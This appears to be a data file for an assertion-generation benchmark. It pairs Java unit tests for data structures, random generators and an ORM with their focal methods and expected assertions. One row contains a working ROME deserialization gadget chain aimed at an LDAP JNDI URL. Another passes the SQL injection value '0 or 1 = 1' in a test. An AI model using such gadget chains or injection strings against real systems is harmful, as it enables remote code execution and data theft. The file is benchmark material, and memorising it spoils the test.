mPow(final long[][][] q, BigInteger e) { long[][] r = identity(); for(int i = 0; ! e.equals(BigInteger.ZERO); i++) { if (e.testBit(0)) r = multiply(r, q[i]); e = e.shiftRight(1); } return r; }"	assertTrue(Arrays.deepEquals(p, XorShift.mPow(q, BigInteger.valueOf(13))))
"testConflictsBig() { final BloomFilter<Long> bloomFilter = new BloomFilter<>(1000000000, 30, Funnels.longFunnel()); final LongOpenHashSet longs = new LongOpenHashSet(); final SplitMix64RandomGenerator random = new SplitMix64RandomGenerator(5);  for(int i = 10000000; i-- != 0;) { final long l = random.nextLong(); longs.add(l); final Long o = Long.valueOf(l); bloomFilter.add(o); }  ""<AssertPlaceHolder>""; }
size64() { return size; }"	assertEquals(longs.size(), bloomFilter.size64())
"testAdd() { for (final int size: sizes) { // System.out.printf(""CIRCULAR BUFFER OF SIZE %d: "", size); final CircularFifoQueue<Character> cfb = new CircularFifoQueue<>(size); final CircularCharArrayBuffer ccab = new CircularCharArrayBuffer(size); final int times = r.nextInt(50); for (int j = 0; j < times; j++) { final char[] c = new char[1 + r.nextInt(1 + size * 10 / 2)]; final int offset = r.nextInt(c.length); final int len = r.nextInt(c.length - offset); System.arraycopy(RandomStringUtils.randomAlphanumeric(c.length).toCharArray(), 0, c, 0, c.length); for (int i = offset; i < offset + len; i++) cfb.add(Character.valueOf(c[i])); ccab.add(c, offset, len); final char[] res = new char[cfb.size()]; copyInto(cfb, res, 0, cfb.size()); final char[] res2 = new char[cfb.size()]; ccab.toCharArray(res2, 0, cfb.size()); ""<AssertPlaceHolder>""; } } }
size() { return len; }"	assertEquals(new String(res), new String(res2))
"testSurrogatePairs() { final List<String> c = Arrays.asList(new String[] { ""a"", ""AB\uE000AB"", ""\uD800\uDF02"", ""\uD800\uDF03"", ""b"" }); for(final boolean utf8: new boolean[] { false, true }) for(int ratio = 1; ratio < 8; ratio++) { final FrontCodedStringList fcl = new FrontCodedStringList(c.iterator(), ratio, utf8); for(int i = 0; i < fcl.size(); i++) { ""<AssertPlaceHolder>""; } } }
get(final int index) { return MutableString.wrap(utf8 ? byte2Char(byteFrontCodedList.getArray(index), null) : charFrontCodedList.getArray(index)); }"	assertEquals(Integer.toString(i), c.get(i), fcl.get(i).toString())
"testSingle() { final int numTrials = 10;  for(final int size: new int[] { 1, 10, 100, 1000, 100000 }) for(final int log2m: new int[] { 6, 8, 12 }) { final double rsd = HyperLogLogCounterArray.relativeStandardDeviation(log2m); int correct = 0; for (int trial = 0; trial < numTrials; trial++) { final HyperLogLogCounterArray a = new HyperLogLogCounterArray(1, size, log2m, trial); final int incr = (int)((1L << 32) / size); int x = Integer.MIN_VALUE; for(int i = 0; i < size; i++) { a.add(0, x); x += incr; }  //System.err.println(""Trial "" + trial + "", size "" + size + "", error: "" + (size - a.count(0)) / size + "" "" + (Math.abs(size - a.count(0)) < 2 * rsd * size ? ""(+)"" : ""(-)"")); if (Math.abs(size - a.count(0)) / size < 2 * rsd) correct++; }  //System.err.println(""Correct trials for size "" + size + "", rsd "" + rsd + "": "" + correct); ""<AssertPlaceHolder>""; } }
count(final long k) { return count(bits[chunk(k)], offset(k)); }"	"assertTrue(correct + "" < "" + 9, correct >= 9)"
"testSum() { final KahanSummation sum = new KahanSummation(); sum.add(1); sum.add(2); sum.add(3); ""<AssertPlaceHolder>""; }
value() { return value; }"	assertEquals(6, sum.value(), 0)
"testDifficult() { final KahanSummation sum = new KahanSummation(); sum.add(Double.MIN_NORMAL); sum.add(Double.MIN_NORMAL); sum.add(-Double.MIN_NORMAL); ""<AssertPlaceHolder>""; }
value() { return value; }"	assertEquals(Double.MIN_NORMAL, sum.value(), 0)
"IOException {  final long[] longs = {  }; final LongList listOffsets = new LongArrayList(longs);  new SemiExternalGammaList(buildInputStream(listOffsets), 1, listOffsets.size()); ""<AssertPlaceHolder>""; }
size() { return numLongs; }"	assertTrue(true)
"testJump() { final XorShift1024StarPhiRandomGenerator xorShiftRandom0 = new XorShift1024StarPhiRandomGenerator(0), xorShiftRandom1 = new XorShift1024StarPhiRandomGenerator(0); xorShiftRandom0.nextLong(); xorShiftRandom0.jump(); xorShiftRandom1.jump(); xorShiftRandom1.nextLong(); ""<AssertPlaceHolder>""; }
nextLong() { final long s0 = s[p]; long s1 = s[p = (p + 1) & 15]; s1 ^= s1 << 31; return (s[p] = s1 ^ s0 ^ (s1 >>> 11) ^ (s0 >>> 30)) * 0x9e3779b97f4a7c13L; }"	assertEquals(xorShiftRandom0.nextLong(), xorShiftRandom1.nextLong())
"testJump() { final XorShift1024StarPhiRandom xorShiftRandom0 = new XorShift1024StarPhiRandom(0), xorShiftRandom1 = new XorShift1024StarPhiRandom(0); xorShiftRandom0.nextLong(); xorShiftRandom0.jump(); xorShiftRandom1.jump(); xorShiftRandom1.nextLong(); ""<AssertPlaceHolder>""; }
nextLong() { final long s0 = s[p]; long s1 = s[p = (p + 1) & 15]; s1 ^= s1 << 31; return (s[p] = s1 ^ s0 ^ (s1 >>> 11) ^ (s0 >>> 30)) * 0x9e3779b97f4a7c13L; }"	assertEquals(xorShiftRandom0.nextLong(), xorShiftRandom1.nextLong())
"testJump() { final XorShift1024StarRandomGenerator xorShiftRandom0 = new XorShift1024StarRandomGenerator(0), xorShiftRandom1 = new XorShift1024StarRandomGenerator(0); xorShiftRandom0.nextLong(); xorShiftRandom0.jump(); xorShiftRandom1.jump(); xorShiftRandom1.nextLong(); ""<AssertPlaceHolder>""; }
nextLong() { final long s0 = s[p]; long s1 = s[p = (p + 1) & 15]; s1 ^= s1 << 31; return (s[p] = s1 ^ s0 ^ (s1 >>> 11) ^ (s0 >>> 30)) * 1181783497276652981L; }"	assertEquals(xorShiftRandom0.nextLong(), xorShiftRandom1.nextLong())
"testJump() { final XorShift1024StarRandom xorShiftRandom0 = new XorShift1024StarRandom(0), xorShiftRandom1 = new XorShift1024StarRandom(0); xorShiftRandom0.nextLong(); xorShiftRandom0.jump(); xorShiftRandom1.jump(); xorShiftRandom1.nextLong(); ""<AssertPlaceHolder>""; }
nextLong() { final long s0 = s[p]; long s1 = s[p = (p + 1) & 15]; s1 ^= s1 << 31; return (s[p] = s1 ^ s0 ^ (s1 >>> 11) ^ (s0 >>> 30)) * 1181783497276652981L; }"	assertEquals(xorShiftRandom0.nextLong(), xorShiftRandom1.nextLong())
"Exception { Object payload = Payloads.ROME.getPayload().getPayload(new String[]{""ldap://127.0.0.1:43658/Calc""}); Assert.""<AssertPlaceHolder>"";; }
getPayload(String[] args) { if (this.args != null) args = this.args; try { JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setDataSourceName(args[0]); rs.setMatchColumn(""foo""); Reflections.getField(javax.sql.rowset.BaseRowSet.class, ""listeners"").set(rs, null);  ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs); EqualsBean root = new EqualsBean(ToStringBean.class, item);  HashMap s = new HashMap<>(); Reflections.setFieldValue(s, ""size"", 2); Class<?> nodeC; try { nodeC = Class.forName(""java.util.HashMap$Node""); } catch (ClassNotFoundException e) { nodeC = Class.forName(""java.util.HashMap$Entry""); } Constructor<?> nodeCons = nodeC .getDeclaredConstructor(int.class, Object.class, Object.class, nodeC); nodeCons.setAccessible(true);  Object tbl = Array.newInstance(nodeC, 2); Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null)); Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null)); Reflections.setFieldValue(s, ""table"", tbl); return s; } catch (Exception e) { e.printStackTrace(); } return null; }"	assertNotNull(payload)
"selectByPrimaryKey() { final MysqlUserEntity mysqlUserEntity = BraveSql.build(MysqlUserEntity.class).selectByPrimaryKey(1); Assert.""<AssertPlaceHolder>""; log.info(""mysqlUserEntity : {}"", mysqlUserEntity); }
selectByPrimaryKey(Object primaryKeyValue) throws SQLException, InstantiationException, IllegalAccessException;  T selectSingle() throws SQLException, InstantiationException, IllegalAccessException;  List<T> select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertNotNull(mysqlUserEntity)
"selectByPrimaryKey2() { final MysqlUserEntity mysqlUserEntity = BraveSql.build(MysqlUserEntity.class).selectByPrimaryKey(""0 or 1 = 1""); Assert.""<AssertPlaceHolder>""; }
selectByPrimaryKey(Object primaryKeyValue) throws SQLException, InstantiationException, IllegalAccessException;  T selectSingle() throws SQLException, InstantiationException, IllegalAccessException;  List<T> select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertNull(mysqlUserEntity)
"selectSingle() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andEqualTo(MysqlUserEntity::getId, 1); final MysqlUserEntity mysqlUserEntity = BraveSql.build(dynamicSql, MysqlUserEntity.class).selectSingle(); Assert.""<AssertPlaceHolder>""; log.info(""mysqlUserEntity : {}"", mysqlUserEntity); }
selectSingle() throws SQLException, InstantiationException, IllegalAccessException;  List<T> select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertNotNull(mysqlUserEntity)
"selectSingle2() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andIn(MysqlUserEntity::getId, Arrays.asList(1, 1, 1, 1, 1, 1)); final MysqlUserEntity mysqlUserEntity = BraveSql.build(dynamicSql, MysqlUserEntity.class).selectSingle(); Assert.""<AssertPlaceHolder>""; log.info(""mysqlUserEntity : {}"", mysqlUserEntity); }
selectSingle() throws SQLException, InstantiationException, IllegalAccessException;  List<T> select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertNotNull(mysqlUserEntity)
"selectSingle3() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andIn(MysqlUserEntity::getId, Arrays.asList(1, 1, 1, 1, 1, 1)); dynamicSql.andEqualTo(MysqlUserEntity::getId, 1); final MysqlUserEntity mysqlUserEntity = BraveSql.build(dynamicSql, MysqlUserEntity.class).selectSingle(); Assert.""<AssertPlaceHolder>""; log.info(""mysqlUserEntity : {}"", mysqlUserEntity); }
selectSingle() throws SQLException, InstantiationException, IllegalAccessException;  List<T> select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertNotNull(mysqlUserEntity)
"selectSingle4() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andIn(MysqlUserEntity::getId, Arrays.asList(1, 1, 1, 1, 1, 1)); dynamicSql.andEqualTo(MysqlUserEntity::getId, 1); dynamicSql.andEqualTo(MysqlUserEntity::getGender, ""未知""); final MysqlUserEntity mysqlUserEntity = BraveSql.build(dynamicSql, MysqlUserEntity.class).selectSingle(); Assert.""<AssertPlaceHolder>""; log.info(""mysqlUserEntity : {}"", mysqlUserEntity); }
selectSingle() throws SQLException, InstantiationException, IllegalAccessException;  List<T> select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertNotNull(mysqlUserEntity)
"selectSingle5() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andIn(MysqlUserEntity::getId, Arrays.asList(1, 1, 1, 1, 1, 1)); dynamicSql.andEqualTo(MysqlUserEntity::getId, 1); dynamicSql.andEqualTo(MysqlUserEntity::getGender, GenderEnum.未知); final MysqlUserEntity mysqlUserEntity = BraveSql.build(dynamicSql, MysqlUserEntity.class).selectSingle(); Assert.""<AssertPlaceHolder>""; log.info(""mysqlUserEntity : {}"", mysqlUserEntity); }
selectSingle() throws SQLException, InstantiationException, IllegalAccessException;  List<T> select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertNotNull(mysqlUserEntity)
"selectSingle6() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andIn(MysqlUserEntity::getId, Arrays.asList(1, 1, 1, 1, 1, 1)); dynamicSql.andEqualTo(MysqlUserEntity::getId, 1); dynamicSql.andIn(MysqlUserEntity::getGender, Arrays.asList(GenderEnum.未知, GenderEnum.未知, GenderEnum.未知)); final MysqlUserEntity mysqlUserEntity = BraveSql.build(dynamicSql, MysqlUserEntity.class).selectSingle(); Assert.""<AssertPlaceHolder>""; log.info(""mysqlUserEntity : {}"", mysqlUserEntity); }
selectSingle() throws SQLException, InstantiationException, IllegalAccessException;  List<T> select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertNotNull(mysqlUserEntity)
"selectSingle7() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andEqualTo(MysqlUserEntity::getDateOfBirth, LocalDate.now()); final List<MysqlUserEntity> entities = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); Assert.""<AssertPlaceHolder>""; log.info(""entities :{}"", entities); log.info(""entities.size() :{}"", entities.size()); }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertFalse(entities.isEmpty())
"selectSingle8() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andIn(MysqlUserEntity::getDateOfBirth, Arrays.asList(LocalDate.now(), LocalDate.now(), LocalDate.now(), LocalDate.now())); final List<MysqlUserEntity> entities = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); Assert.""<AssertPlaceHolder>""; log.info(""entities.size() :{}"", entities.size()); }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertFalse(entities.isEmpty())
"selectSingle9() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); final String format = LocalDate.now().format(DateTimeFormatter.ofPattern(""yyyy-MM-dd"")); dynamicSql.andEqualTo(MysqlUserEntity::getDateOfBirth, format); final List<MysqlUserEntity> entities = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); Assert.""<AssertPlaceHolder>""; log.info(""entities.size() :{}"", entities.size()); }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertFalse(entities.isEmpty())
"selectSingle10() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); final String format = LocalDate.now().format(DateTimeFormatter.ofPattern(""yyyy-MM-dd"")); dynamicSql.andIn(MysqlUserEntity::getDateOfBirth, Arrays.asList(format, format, format, format, format)); final List<MysqlUserEntity> entities = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); Assert.""<AssertPlaceHolder>""; log.info(""entities.size() :{}"", entities.size()); }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertFalse(entities.isEmpty())
"selectSingle11() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andLessThanOrEqualTo(MysqlUserEntity::getDateOfBirth, LocalDate.now()); final List<MysqlUserEntity> entities = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); Assert.""<AssertPlaceHolder>""; log.info(""entities.size() :{}"", entities.size()); }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(entities.size(), 1000)
"selectSingle12() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andLessThan(MysqlUserEntity::getDateOfBirth, LocalDate.now()); final List<MysqlUserEntity> entities = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); Assert.""<AssertPlaceHolder>""; log.info(""entities.size() :{}"", entities.size()); }
